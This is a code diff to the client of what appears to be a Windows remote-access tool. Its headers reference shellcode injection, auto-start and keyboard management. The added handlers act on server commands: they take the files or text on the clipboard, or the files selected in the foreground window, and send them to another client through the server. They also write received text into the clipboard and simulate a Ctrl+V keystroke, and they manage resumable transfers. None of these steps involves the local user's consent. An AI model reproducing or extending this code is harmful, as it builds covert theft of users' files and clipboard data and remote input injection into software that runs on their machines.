@@ -19,6 +19,7 @@
 #include "auto_start.h"
 #include "ShellcodeInj.h"
 #include "KeyboardManager.h"
+#include "common/file_upload.h"
 extern "C" {
 #include "ServiceWrapper.h"
 }
@@ -71,19 +72,38 @@ CKernelManager::CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, 
 #endif
     m_nNetPing = {};
     m_hKeyboard = kb;
+    // C2C 初始化
+    if (conn) m_MyClientID = conn->clientID;
+}
+
+BOOL IsThreadsRunning(ThreadInfo* threads, int count)
+{
+    for (int i = 0; i < count; ++i) {
+        if (threads[i].p) {
+            return TRUE;
+        }
+    }
+    return FALSE;
 }
 
 CKernelManager::~CKernelManager()
 {
     Mprintf("~CKernelManager begin\n");
-    int i = 0;
-    for (i=0; i<MAX_THREADNUM; ++i) {
+    HANDLE hList[MAX_THREADNUM] = {};
+    for (int i=0; i<MAX_THREADNUM; ++i) {
         if (m_hThread[i].h!=0) {
+			hList[i] = m_hThread[i].h;
             SAFE_CLOSE_HANDLE(m_hThread[i].h);
             m_hThread[i].h = NULL;
             m_hThread[i].run = FALSE;
-            while (m_hThread[i].p)
-                Sleep(50);
+        }
+    }
+
+    WAIT_n(IsThreadsRunning(m_hThread, MAX_THREADNUM), 5, 50);
+    for (int i = 0; i < MAX_THREADNUM; ++i) {
+        if (hList[i] != 0 && m_hThread[i].p) {
+            Mprintf("~CKernelManager: TerminateThread for %d\n", i);
+            TerminateThread(hList[i], 0x20260226);
         }
     }
     m_ulThreadCount = 0;
@@ -1025,6 +1045,283 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             Mprintf("CKernelManager: [%s] Execute FAILED.\n", curFile);
         } else {
             Mprintf("=====> 客户端类型'%d'不支持文件升级\n", typ);
+        }
+        break;
+    }
+
+    case COMMAND_SEND_FILE_V2: {
+        // C2C/V2 文件接收（RecvFileChunkV2 内部会打印进度）
+        int n = RecvFileChunkV2((char*)szBuffer, ulLength, m_conn,
+            nullptr, m_hash, m_hmac, m_MyClientID);
+        if (n) {
+            Mprintf("[C2C] RecvFileChunkV2 failed: %d\n", n);
+        }
+        break;
+    }
+
+    case COMMAND_CLIPBOARD_V2: {
+        // C2C 剪贴板请求：被请求发送剪贴板文件到另一个客户端
+        ClipboardRequestV2* req = (ClipboardRequestV2*)szBuffer;
+        Mprintf("[C2C] 收到剪贴板请求: src=%llu, dst=%llu, transferID=%llu\n",
+            req->srcClientID, req->dstClientID, req->transferID);
+
+        // 从请求包中提取认证信息
+        std::string hash(req->hash, 64);
+        std::string hmac(req->hmac, 16);
+
+        // 获取剪贴板文件或选中文件
+        int result = 0;
+        auto files = GetClipboardFiles(result);
+        if (files.empty()) {
+            files = GetForegroundSelectedFiles(result);
+        }
+
+        if (!files.empty()) {
+            // C2C: 不指定目标目录，由接收方决定
+            std::string targetDir = "";
+
+            // 收集文件信息（使用相对路径，接收方使用后缀匹配）
+            std::vector<std::pair<std::string, uint64_t>> fileInfos;
+            std::string rootDir = GetCommonRoot(files);
+            for (size_t i = 0; i < files.size(); i++) {
+                std::string relPath = GetRelativePath(rootDir, files[i]);
+                std::replace(relPath.begin(), relPath.end(), '\\', '/');
+                // 获取文件大小
+                HANDLE hFile = CreateFileA(files[i].c_str(), GENERIC_READ, FILE_SHARE_READ,
+                    nullptr, OPEN_EXISTING, 0, nullptr);
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    LARGE_INTEGER size;
+                    GetFileSizeEx(hFile, &size);
+                    CloseHandle(hFile);
+                    fileInfos.push_back({relPath, (uint64_t)size.QuadPart});
+                }
+            }
+
+            // 发送续传查询（通过主连接，响应也会回到主连接）
+            bool queryPending = false;
+            if (!fileInfos.empty()) {
+                auto queryPkt = BuildResumeQuery(req->transferID, m_MyClientID, req->dstClientID, fileInfos);
+                if (!queryPkt.empty()) {
+                    m_ClientObject->Send2Server((char*)queryPkt.data(), (int)queryPkt.size());
+                    Mprintf("[C2C] 发送续传查询: %zu 个文件, 使用完整路径\n", fileInfos.size());
+                    queryPending = true;
+                }
+            }
+
+            TransferOptionsV2 opts;
+            opts.transferID = req->transferID;
+            opts.srcClientID = m_MyClientID;  // 我是源
+            opts.dstClientID = req->dstClientID;  // 目标客户端
+            opts.enableResume = queryPending;  // 只有发送了查询才等待响应
+
+            IOCPClient* pClient = new IOCPClient(g_bExit, true, MaskTypeNone, m_conn);
+            if (pClient->ConnectServer(m_ClientObject->ServerIP().c_str(), m_ClientObject->ServerPort())) {
+                std::thread([files, targetDir, pClient, opts, hash, hmac]() {
+                    FileBatchTransferWorkerV2(files, targetDir, pClient,
+                        [](void* user, FileChunkPacketV2* chunk, unsigned char* data, int size) -> bool {
+                            IOCPClient* client = (IOCPClient*)user;
+                            return client->Send2Server((char*)data, size) != FALSE;
+                        },
+                        [](void* user) {
+                            IOCPClient* client = (IOCPClient*)user;
+                            delete client;
+                            Mprintf("[C2C] 文件发送完成\n");
+                        },
+                        hash, hmac, opts);
+                }).detach();
+                Mprintf("[C2C] 开始发送 %zu 个文件到客户端 %llu\n", files.size(), req->dstClientID);
+            } else {
+                delete pClient;
+                Mprintf("[C2C] 连接服务器失败\n");
+            }
+        } else {
+            // 没有文件，尝试发送剪贴板文本
+            std::string text;
+            if (::OpenClipboard(NULL)) {
+                HGLOBAL hGlobal = GetClipboardData(CF_UNICODETEXT);
+                if (hGlobal) {
+                    wchar_t* pWideStr = (wchar_t*)GlobalLock(hGlobal);
+                    if (pWideStr) {
+                        int len = WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, NULL, 0, NULL, NULL);
+                        if (len > 0) {
+                            text.resize(len);
+                            WideCharToMultiByte(CP_UTF8, 0, pWideStr, -1, &text[0], len, NULL, NULL);
+                            text.resize(strlen(text.c_str()));  // 去除末尾 \0
+                        }
+                        GlobalUnlock(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+            if (!text.empty()) {
+                // 构建 C2C 文本包: [cmd:1][dstClientID:8][textLen:4][text:N]
+                uint32_t textLen = (uint32_t)text.size();
+                std::vector<char> pkt(1 + 8 + 4 + textLen);
+                pkt[0] = COMMAND_C2C_TEXT;
+                memcpy(&pkt[1], &req->dstClientID, 8);
+                memcpy(&pkt[9], &textLen, 4);
+                memcpy(&pkt[13], text.data(), textLen);
+                m_ClientObject->Send2Server(pkt.data(), (int)pkt.size());
+                Mprintf("[C2C] 发送文本到客户端 %llu (%u 字节)\n", req->dstClientID, textLen);
+            } else {
+                Mprintf("[C2C] 没有找到要发送的文件或文本\n");
+            }
+        }
+        break;
+    }
+
+    case COMMAND_C2C_PREPARE: {
+        // C2C 准备接收：捕获当前目录并返回路径给发送方
+        if (ulLength < sizeof(C2CPreparePacket)) break;
+        C2CPreparePacket* pkt = (C2CPreparePacket*)szBuffer;
+        Mprintf("[C2C] 收到准备接收通知: transferID=%llu, srcClientID=%llu\n",
+            pkt->transferID, pkt->srcClientID);
+
+        // 捕获当前目录
+        SetC2CTargetFolder(pkt->transferID);
+
+        // 获取目标目录并返回给发送方
+        std::string targetDir;
+        if (!GetCurrentFolderPath(targetDir)) {
+            char tempPath[MAX_PATH];
+            GetTempPathA(MAX_PATH, tempPath);
+            targetDir = std::string(tempPath) + "C2CRecv\\";
+        }
+
+        // 转换为 UTF-8
+        int wideLen = MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, nullptr, 0);
+        std::wstring wideDir(wideLen - 1, 0);
+        MultiByteToWideChar(CP_ACP, 0, targetDir.c_str(), -1, &wideDir[0], wideLen);
+        int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, nullptr, 0, nullptr, nullptr);
+        std::string utf8Dir(utf8Len - 1, 0);
+        WideCharToMultiByte(CP_UTF8, 0, wideDir.c_str(), -1, &utf8Dir[0], utf8Len, nullptr, nullptr);
+
+        // 构建响应包
+        std::vector<uint8_t> respBuf(sizeof(C2CPrepareRespPacket) + utf8Dir.size());
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)respBuf.data();
+        resp->cmd = COMMAND_C2C_PREPARE_RESP;
+        resp->transferID = pkt->transferID;
+        resp->srcClientID = pkt->srcClientID;  // 原始发送方，服务端据此路由
+        resp->pathLength = (uint16_t)utf8Dir.size();
+        memcpy(respBuf.data() + sizeof(C2CPrepareRespPacket), utf8Dir.c_str(), utf8Dir.size());
+
+        // 发送响应（通过服务端路由到发送方）
+        m_ClientObject->Send2Server((char*)respBuf.data(), (int)respBuf.size());
+        Mprintf("[C2C] 发送目录响应: %s -> srcClient=%llu\n", targetDir.c_str(), pkt->srcClientID);
+        break;
+    }
+
+    case COMMAND_C2C_PREPARE_RESP: {
+        // C2C 准备响应：收到目标客户端的目录（我是发送方）
+        if (ulLength < sizeof(C2CPrepareRespPacket)) break;
+        C2CPrepareRespPacket* resp = (C2CPrepareRespPacket*)szBuffer;
+        uint16_t pathLen = resp->pathLength;
+        if (ulLength < sizeof(C2CPrepareRespPacket) + pathLen) break;
+
+        // 提取 UTF-8 目录路径
+        std::string utf8Dir((const char*)szBuffer + sizeof(C2CPrepareRespPacket), pathLen);
+
+        // UTF-8 -> 宽字符
+        int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, nullptr, 0);
+        std::wstring wideDir(wlen - 1, 0);
+        MultiByteToWideChar(CP_UTF8, 0, utf8Dir.c_str(), -1, &wideDir[0], wlen);
+
+        // 存储目标目录（用于后续构建完整路径进行断点续传）
+        SetSenderTargetFolder(resp->transferID, wideDir);
+        Mprintf("[C2C] 收到目标目录响应: transferID=%llu, dir=%s\n", resp->transferID, utf8Dir.c_str());
+        break;
+    }
+
+    case COMMAND_C2C_TEXT: {
+        // C2C 文本剪贴板: [cmd:1][dstClientID:8][textLen:4][text:N]
+        if (ulLength < 13) break;
+        uint32_t textLen;
+        memcpy(&textLen, szBuffer + 9, 4);
+        if (ulLength < 13 + textLen) break;
+
+        // UTF-8 文本转换为 Unicode 并设置剪贴板
+        std::string utf8Text((const char*)szBuffer + 13, textLen);
+        int wideLen = MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, NULL, 0);
+        if (wideLen > 0) {
+            std::wstring wideText(wideLen, 0);
+            MultiByteToWideChar(CP_UTF8, 0, utf8Text.c_str(), -1, &wideText[0], wideLen);
+
+            if (::OpenClipboard(NULL)) {
+                ::EmptyClipboard();
+                HGLOBAL hGlobal = GlobalAlloc(GMEM_MOVEABLE, wideLen * sizeof(wchar_t));
+                if (hGlobal) {
+                    wchar_t* pDst = (wchar_t*)GlobalLock(hGlobal);
+                    if (pDst) {
+                        wcscpy(pDst, wideText.c_str());
+                        GlobalUnlock(hGlobal);
+                        SetClipboardData(CF_UNICODETEXT, hGlobal);
+                        Mprintf("[C2C] 收到文本: %u 字节\n", textLen);
+
+                        // 模拟 Ctrl+V 完成粘贴（因为原始 Ctrl+V 被服务端拦截了）
+                        ::CloseClipboard();
+                        INPUT inputs[4] = {};
+                        inputs[0].type = INPUT_KEYBOARD;
+                        inputs[0].ki.wVk = VK_CONTROL;
+                        inputs[1].type = INPUT_KEYBOARD;
+                        inputs[1].ki.wVk = 'V';
+                        inputs[2].type = INPUT_KEYBOARD;
+                        inputs[2].ki.wVk = 'V';
+                        inputs[2].ki.dwFlags = KEYEVENTF_KEYUP;
+                        inputs[3].type = INPUT_KEYBOARD;
+                        inputs[3].ki.wVk = VK_CONTROL;
+                        inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
+                        SendInput(4, inputs, sizeof(INPUT));
+                        break;
+                    } else {
+                        GlobalFree(hGlobal);
+                    }
+                }
+                ::CloseClipboard();
+            }
+        }
+        break;
+    }
+
+    case COMMAND_FILE_COMPLETE_V2: {
+        // C2C 文件完成校验
+        if (ulLength < sizeof(FileCompletePacketV2)) break;
+        const FileCompletePacketV2* completePkt = (const FileCompletePacketV2*)szBuffer;
+        bool verifyOk = HandleFileCompleteV2((const char*)szBuffer, ulLength, m_MyClientID);
+        Mprintf("[C2C] 文件校验%s: transferID=%llu, fileIndex=%u\n",
+            verifyOk ? "通过" : "失败", completePkt->transferID, completePkt->fileIndex);
+        break;
+    }
+
+    case COMMAND_FILE_QUERY_RESUME: {
+        // C2C 断点续传查询
+        Mprintf("[C2C] 收到断点续传查询\n");
+        auto response = HandleResumeQuery((const char*)szBuffer, ulLength);
+        if (!response.empty()) {
+            m_ClientObject->Send2Server((char*)response.data(), (int)response.size());
+            Mprintf("[C2C] 已响应断点续传查询: %zu 字节\n", response.size());
+        }
+        break;
+    }
+
+    case COMMAND_FILE_RESUME: {
+        // 检查是否为取消包
+        if (ulLength >= sizeof(FileResumePacketV2)) {
+            const FileResumePacketV2* pkt = (const FileResumePacketV2*)szBuffer;
+            if (pkt->flags & FFV2_CANCEL) {
+                // 取消传输：通知发送线程停止
+                CancelTransfer(pkt->transferID);
+                CleanupResumeState(pkt->transferID);
+                Mprintf("[C2C] 传输已取消: transferID=%llu\n", pkt->transferID);
+                break;
+            }
+        }
+        // C2C 断点续传响应
+        std::map<uint32_t, uint64_t> offsets;
+        if (ParseResumeResponse((const char*)szBuffer, ulLength, offsets)) {
+            Mprintf("[C2C] 收到续传响应: %zu 个文件\n", offsets.size());
+            SetPendingResumeOffsets(offsets);
+        } else {
+            Mprintf("[C2C] 解析续传响应失败\n");
         }
         break;
     }
